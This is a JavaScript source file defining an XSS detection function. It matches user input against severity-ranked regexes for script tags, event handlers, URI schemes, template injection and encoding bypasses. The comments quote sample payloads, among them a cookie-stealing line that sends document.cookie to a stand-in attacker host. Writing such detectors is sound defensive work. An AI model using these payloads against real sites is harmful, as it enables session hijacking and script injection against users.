/**
 * detectAttack
 * WHY: This utility function inspects user-submitted strings for signatures of XSS vectors.
 * It uses a layered regex approach covering 17+ known attack categories.
 * IMPORTANT: This is a detection/warning layer ONLY. DOMPurify in sanitizer.js handles
 * the actual cleanup. Regex can be bypassed by creative encoding — always use both layers.
 *
 * Severity Levels:
 *  - CRITICAL: Immediate code execution possible (script tags, cookie stealers, polyglots)
 *  - HIGH:     Likely execution via events or protocol exploits
 *  - MEDIUM:   Encoding/filter bypasses — dangerous when combined with other vectors
 *  - LOW:      Ambiguous patterns (template syntax, math evaluation)
 *
 * @param {string} input - The raw user text to scan.
 * @returns {{ isAttack: boolean, type: string, severity: string }}
 */
export function detectAttack(input) {
  if (!input) return { isAttack: false, type: "", severity: "" };

  // ─── CRITICAL SEVERITY ────────────────────────────────────────────────────

  // 1. Cookie Stealer — Check FIRST: document.cookie exfiltration is the most dangerous payload.
  // WHY: Attackers send session cookies to a remote server, allowing account hijacking.
  // Example: new Image().src="http://attacker.com/?c=" + document.cookie
  const cookieStealerRegex = /document\.cookie/i;
  if (cookieStealerRegex.test(input)) {
    return { isAttack: true, type: "🍪 Cookie Stealer (document.cookie)", severity: "CRITICAL" };
  }

  // 2. Polyglot XSS — Combines multiple vectors in a single payload to bypass any one filter.
  // WHY: Polyglots are crafted to execute in as many contexts as possible simultaneously.
  // Example: jaVasCript:/*...*/oNcliCk=alert()
  const polyglotRegex = /jaVasCript|oNcliCk|oNloAd|stYle.*titLe|scRipt.*sVg/i;
  if (polyglotRegex.test(input)) {
    return { isAttack: true, type: "☢️ Polyglot XSS (Multi-Vector)", severity: "CRITICAL" };
  }

  // 3. Classic Script Tag — <script>alert(1)</script> and case variations like <ScRiPt>
  // WHY: The browser executes script tags parsed from innerHTML, allowing arbitrary JS.
  // RegExp constructor used to avoid JSX/Babel parsing confusion with literal '<' in regex.
  const scriptRegex = new RegExp('<\\s*s\\s*c\\s*r\\s*i\\s*p\\s*t', 'i');
  if (scriptRegex.test(input)) {
    return { isAttack: true, type: "💉 Script Tag Injection (<script>)", severity: "CRITICAL" };
  }

  // 4. SVG-embedded Script — <svg><script>alert(1)</script></svg>
  // WHY: SVG documents can embed full script blocks. The SVG XML parser processes them.
  const svgScriptRegex = new RegExp('<svg[\\s\\S]*<script', 'i');
  if (svgScriptRegex.test(input)) {
    return { isAttack: true, type: "💉 SVG Script Injection (<svg><script>)", severity: "CRITICAL" };
  }

  // ─── HIGH SEVERITY ────────────────────────────────────────────────────────

  // 5. Iframe Injection — <iframe src="javascript:...">
  // WHY: Iframes can embed pages, run JS protocols in src, or load external malware.
  const iframeRegex = new RegExp('<\\s*iframe', 'i');
  if (iframeRegex.test(input)) {
    return { isAttack: true, type: "🖼️ Iframe Injection (<iframe>)", severity: "HIGH" };
  }

  // 6. SVG Onload — <svg onload=alert(1)> or <svg/onload=alert(1)>
  // WHY: The onload event fires as soon as the SVG is rendered. No user interaction required.
  const svgOnloadRegex = new RegExp('<\\s*svg[^>]*onload', 'i');
  if (svgOnloadRegex.test(input)) {
    return { isAttack: true, type: "🔺 SVG Onload Injection (<svg onload>)", severity: "HIGH" };
  }

  // 7. SVG Animate onbegin — <svg><animate onbegin=alert(1) attributeName=x>
  // WHY: The onbegin event fires when an SVG animation starts — no user click needed.
  const svgAnimateRegex = new RegExp('<\\s*animate[^>]*onbegin', 'i');
  if (svgAnimateRegex.test(input)) {
    return { isAttack: true, type: "🔺 SVG Animate onbegin Injection", severity: "HIGH" };
  }

  // 8. Body Onload — <body onload=alert(1)>
  // WHY: If the body tag is injected into a page, its onload fires automatically on render.
  const bodyOnloadRegex = new RegExp('<\\s*body[^>]*on\\w+\\s*=', 'i');
  if (bodyOnloadRegex.test(input)) {
    return { isAttack: true, type: "⚡ Body Event Injection (<body onload>)", severity: "HIGH" };
  }

  // 9. HTML5 Autofocus Events — <input autofocus onfocus=alert(1)>
  // WHY: The autofocus attribute moves focus automatically on page load, triggering onfocus
  // without any user interaction. Common bypass for filters that only check onclick.
  const autofocusRegex = /autofocus[^>]*on\w+\s*=/i;
  if (autofocusRegex.test(input)) {
    return { isAttack: true, type: "⚡ Autofocus Event Injection (onfocus)", severity: "HIGH" };
  }

  // 10. Extended HTML5 Event Handlers — ontoggle, onloadstart, onstart, onbegin, onplay...
  // WHY: Modern HTML5 elements have many new event attributes beyond onerror/onclick.
  // Filters that only block classic events miss these. <details ontoggle>, <video onloadstart>
  const html5EventRegex = /\b(ontoggle|onloadstart|onstart|onbegin|onplay|onpause|oninput|onblur|onkeydown|onkeyup|onmouseover|onmouseout|onpageshow|onanimationstart|onwheel|onfocusin|onfocusout)\s*=/i;
  if (html5EventRegex.test(input)) {
    const match = input.match(html5EventRegex);
    const handler = match ? match[0].replace(/\s*=/, '').trim() : 'event';
    return { isAttack: true, type: `⚡ HTML5 Event Handler (${handler})`, severity: "HIGH" };
  }

  // 11. Generic Inline Event Handlers — onerror, onclick, onmouseover, etc. (catch-all)
  // WHY: <img src="x" onerror="alert(1)"> is still the most common XSS payload in the wild.
  const eventRegex = /\bon\w+\s*=/i;
  if (eventRegex.test(input)) {
    const match = input.match(eventRegex);
    const handler = match ? match[0].replace(/\s*=/, '').trim() : 'event';
    return { isAttack: true, type: `⚡ Inline Event Handler (${handler})`, severity: "HIGH" };
  }

  // 12. JavaScript URI — javascript:alert(1) in href, src, action, etc.
  // WHY: <a href="javascript:alert(1)"> executes JS when clicked. Very common phishing vector.
  const jsProtoRegex = /javascript\s*:/i;
  if (jsProtoRegex.test(input)) {
    return { isAttack: true, type: "🔗 JavaScript URI (javascript:)", severity: "HIGH" };
  }

  // 13. Data URI — data:text/html — can embed full HTML pages inline as a src.
  // WHY: <iframe src="data:text/html,<script>alert(1)</script>"> bypasses same-origin checks.
  const dataURIRegex = /data\s*:\s*text\/html/i;
  if (dataURIRegex.test(input)) {
    return { isAttack: true, type: "📄 Data URI Injection (data:text/html)", severity: "HIGH" };
  }

  // 14. VBScript URI — vbscript: (IE legacy attack, still tested in pentests)
  // WHY: Older IE browsers execute vbscript: URIs the same way as javascript: URIs.
  const vbscriptRegex = /vbscript\s*:/i;
  if (vbscriptRegex.test(input)) {
    return { isAttack: true, type: "👾 VBScript URI Injection (vbscript:)", severity: "HIGH" };
  }

  // 15. Template Injection — {{...}} or ${...} (AngularJS, Vue, server-side templates)
  // WHY: Angular/Vue evaluate expressions inside {{ }}. If unsanitized user content reaches
  // the template engine, attackers can execute arbitrary JavaScript via constructor chains.
  // Example: {{constructor.constructor('alert(1)')()}}
  const templateRegex = /\{\{[\s\S]*?\}\}|\$\{[\s\S]*?\}/;
  if (templateRegex.test(input)) {
    return { isAttack: true, type: "🧩 Template Injection ({{...}} / ${...})", severity: "HIGH" };
  }

  // ─── MEDIUM SEVERITY ──────────────────────────────────────────────────────

  // 16. HTML Entity Encoding Bypass — &#97;&#108;&#101;&#114;&#116; = "alert"
  // WHY: Numeric HTML entities are decoded by the browser BEFORE execution.
  // Filters checking for "alert" as a literal string will miss entity-encoded versions.
  const htmlEntityRegex = /&#\d+;/;
  if (htmlEntityRegex.test(input)) {
    return { isAttack: true, type: "🔐 HTML Entity Encoding Bypass (&#xx;)", severity: "MEDIUM" };
  }

  // 17. Double URL Encoding — %253C = %3C = '<' (encoded twice)
  // WHY: Some decoders only run one decode pass. Double-encoding can sneak through a single-pass filter.
  // %25 = the encoded '%', so %253C becomes %3C after one pass = '<' after the second pass.
  const doubleEncodeRegex = /%25[0-9a-fA-F]{2}/;
  if (doubleEncodeRegex.test(input)) {
    return { isAttack: true, type: "🔐 Double URL Encoding Bypass (%25xx)", severity: "MEDIUM" };
  }

  // 18. Null Byte Injection — <scr\x00ipt> splits the tag to confuse parsers
  // WHY: C-based string parsers treat \x00 as string terminator. HTML parsers may ignore it,
  // allowing the browser to reconstruct <script> after null bytes are stripped.
  const nullByteRegex = /\\x00|%00/;
  if (nullByteRegex.test(input)) {
    return { isAttack: true, type: "🔐 Null Byte Injection (\\x00 / %00)", severity: "MEDIUM" };
  }

  return { isAttack: false, type: "", severity: "" };
}
